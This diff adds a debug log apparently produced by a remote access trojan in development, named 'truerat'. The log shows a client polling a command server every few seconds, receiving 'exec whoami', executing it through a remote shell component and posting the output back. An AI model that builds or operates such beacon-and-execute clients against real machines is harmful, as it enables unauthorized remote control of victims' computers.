@@ -1,0 +1,98 @@
+[2025-08-03 01:06:02] [INFO] Test: Info message
+[2025-08-03 01:06:02] [WARN] Test: Warning message
+[2025-08-03 01:06:02] [ERROR] Test: Error message
+[2025-08-03 01:06:02] [INFO] Server URL: 
+[2025-08-03 01:08:28] [INFO] Test: Info message
+[2025-08-03 01:08:28] [WARN] Test: Warning message
+[2025-08-03 01:08:28] [ERROR] Test: Error message
+[2025-08-03 01:08:28] [INFO] Server URL: 
+[2025-08-03 01:11:23] [INFO] Test: Info message
+[2025-08-03 01:11:23] [WARN] Test: Warning message
+[2025-08-03 01:11:23] [ERROR] Test: Error message
+[2025-08-03 01:11:23] [INFO] Server URL: 
+[2025-08-03 01:25:29] [INFO] Test: Info message
+[2025-08-03 01:25:29] [WARN] Test: Warning message
+[2025-08-03 01:25:29] [ERROR] Test: Error message
+[2025-08-03 01:25:29] [INFO] Server URL: http://127.0.0.1/backend/
+[2025-08-03 01:42:45] [INFO] Test: Info message
+[2025-08-03 01:42:45] [WARN] Test: Warning message
+[2025-08-03 01:42:45] [ERROR] Test: Error message
+[2025-08-03 01:42:45] [INFO] Server URL: http://127.0.0.1/backend/
+[2025-08-03 01:46:37] [INFO] Test: Info message
+[2025-08-03 01:46:37] [WARN] Test: Warning message
+[2025-08-03 01:46:37] [ERROR] Test: Error message
+[2025-08-03 01:46:37] [INFO] Server URL: http://127.0.0.1/backend/
+[2025-08-03 01:46:37] [INFO] [Communicator] Starting server communication loop → http://127.0.0.1/backend/
+[2025-08-03 01:46:41] [ERROR] [Communicator] Failed to contact server: No connection could be made because the target machine actively refused it. (127.0.0.1:80)
+[2025-08-03 01:46:48] [ERROR] [Communicator] Failed to contact server: No connection could be made because the target machine actively refused it. (127.0.0.1:80)
+[2025-08-03 01:57:01] [INFO] Test: Info message
+[2025-08-03 01:57:01] [WARN] Test: Warning message
+[2025-08-03 01:57:01] [ERROR] Test: Error message
+[2025-08-03 01:57:01] [INFO] Server URL: http://127.0.0.1/backend/
+[2025-08-03 01:57:01] [INFO] [Communicator] Starting server communication loop → http://127.0.0.1/backend/
+[2025-08-03 01:57:01] [WARN] [Communicator] Server responded with error: NotFound
+[2025-08-03 01:57:06] [WARN] [Communicator] Server responded with error: NotFound
+[2025-08-03 01:57:11] [WARN] [Communicator] Server responded with error: NotFound
+[2025-08-03 01:57:16] [WARN] [Communicator] Server responded with error: NotFound
+[2025-08-03 01:57:51] [INFO] Test: Info message
+[2025-08-03 01:57:51] [WARN] Test: Warning message
+[2025-08-03 01:57:51] [ERROR] Test: Error message
+[2025-08-03 01:57:51] [INFO] Server URL: http://truerat.test/
+[2025-08-03 01:57:51] [INFO] [Communicator] Starting server communication loop → http://truerat.test/
+[2025-08-03 01:57:52] [INFO] [Communicator] Received:  Hello, World! This is a ping response from the server.
+[2025-08-03 01:57:57] [INFO] [Communicator] Received:  Hello, World! This is a ping response from the server.
+[2025-08-03 01:58:02] [INFO] [Communicator] Received:  Hello, World! This is a ping response from the server.
+[2025-08-03 01:58:07] [ERROR] [Communicator] Failed to contact server: An error occurred while sending the request.
+[2025-08-03 01:58:12] [INFO] [Communicator] Received:  Hello, World! This is a ping response from the server.
+[2025-08-03 01:58:17] [INFO] [Communicator] Received:  Hello, World! This is a ping response from the server.
+[2025-08-03 01:58:22] [INFO] [Communicator] Received:  Hello, World! This is a ping response from the server.
+[2025-08-03 02:12:08] [INFO] Test: Info message
+[2025-08-03 02:12:08] [WARN] Test: Warning message
+[2025-08-03 02:12:08] [ERROR] Test: Error message
+[2025-08-03 02:12:08] [INFO] Server URL: http://truerat.test/
+[2025-08-03 02:12:08] [INFO] [Communicator] Starting server communication loop → http://truerat.test/
+[2025-08-03 02:12:09] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:12:09] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:12:09] [INFO] [RemoteShell] Would run: whoami
+[2025-08-03 02:12:14] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:12:14] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:12:14] [INFO] [RemoteShell] Would run: whoami
+[2025-08-03 02:12:19] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:12:19] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:12:19] [INFO] [RemoteShell] Would run: whoami
+[2025-08-03 02:12:24] [ERROR] [Communicator] Failed to contact server: An error occurred while sending the request.
+[2025-08-03 02:12:29] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:12:29] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:12:29] [INFO] [RemoteShell] Would run: whoami
+[2025-08-03 02:12:34] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:12:34] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:12:34] [INFO] [RemoteShell] Would run: whoami
+[2025-08-03 02:12:39] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:12:39] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:12:39] [INFO] [RemoteShell] Would run: whoami
+[2025-08-03 02:22:48] [INFO] Test: Info message
+[2025-08-03 02:22:48] [WARN] Test: Warning message
+[2025-08-03 02:22:48] [ERROR] Test: Error message
+[2025-08-03 02:22:48] [INFO] Server URL: http://truerat.test/
+[2025-08-03 02:22:48] [INFO] [Communicator] Starting server communication loop → http://truerat.test/
+[2025-08-03 02:22:48] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:22:48] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:22:48] [INFO] [RemoteShell] Executing: whoami
+[2025-08-03 02:22:49] [INFO] [RemoteShell] Output: ela--kali\feloe
+[2025-08-03 02:22:49] [INFO] [Communicator] Report posted: OK
+[2025-08-03 02:22:54] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:22:54] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:22:54] [INFO] [RemoteShell] Executing: whoami
+[2025-08-03 02:22:54] [INFO] [RemoteShell] Output: ela--kali\feloe
+[2025-08-03 02:22:54] [INFO] [Communicator] Report posted: OK
+[2025-08-03 02:22:59] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:22:59] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:22:59] [INFO] [RemoteShell] Executing: whoami
+[2025-08-03 02:22:59] [INFO] [RemoteShell] Output: ela--kali\feloe
+[2025-08-03 02:22:59] [INFO] [Communicator] Report posted: OK
+[2025-08-03 02:23:04] [ERROR] [Communicator] Failed to contact server: An error occurred while sending the request.
+[2025-08-03 02:23:09] [INFO] [Communicator] Received: exec whoami
+[2025-08-03 02:23:09] [INFO] [Dispatcher] Command received: exec whoami
+[2025-08-03 02:23:09] [INFO] [RemoteShell] Executing: whoami
+[2025-08-03 02:23:09] [INFO] [RemoteShell] Output: ela--kali\feloe
+[2025-08-03 02:23:09] [INFO] [Communicator] Report posted: OK
